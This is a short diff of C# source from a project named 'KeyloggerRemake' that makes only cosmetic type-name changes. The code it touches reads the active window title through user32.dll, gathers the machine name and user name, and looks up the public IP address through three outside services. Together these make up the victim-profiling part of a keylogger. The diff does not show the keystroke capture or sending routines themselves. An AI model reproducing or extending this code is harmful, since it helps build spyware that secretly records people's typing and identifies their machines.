@@ -13,7 +13,7 @@ namespace KeyloggerRemake
         [DllImport("user32.dll")]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
-        public static String strCurrentWindow = "";
+        public static string strCurrentWindow = "";
 
         public static String getActiveWindowTitle()
         {
@@ -28,22 +28,22 @@ namespace KeyloggerRemake
             return null;
         }
 
-        public static String getUserInfo()
+        public static string getUserInfo()
         {
-            String info = Environment.NewLine + "Computer Name:" + " " + Environment.MachineName + Environment.NewLine
+            string info = Environment.NewLine + "Computer Name:" + " " + Environment.MachineName + Environment.NewLine
                  + "Username:" + " " + Environment.UserName + Environment.NewLine
                  + "IP: " + getIPAddress();
 
             return info;
         }
 
-        public static String getIPAddress()
+        public static string getIPAddress()
         {
-            String strIP = "";
+            string strIP = "";
 
-            String ipAPI1 = "https://api.ipify.org/";
-            String ipAPI2 = "https://ip.seeip.org/";
-            String ipAPI3 = "https://api.ip.sb/ip";
+            string ipAPI1 = "https://api.ipify.org/";
+            string ipAPI2 = "https://ip.seeip.org/";
+            string ipAPI3 = "https://api.ip.sb/ip";
 
             using (WebClient wc = new WebClient())
             {
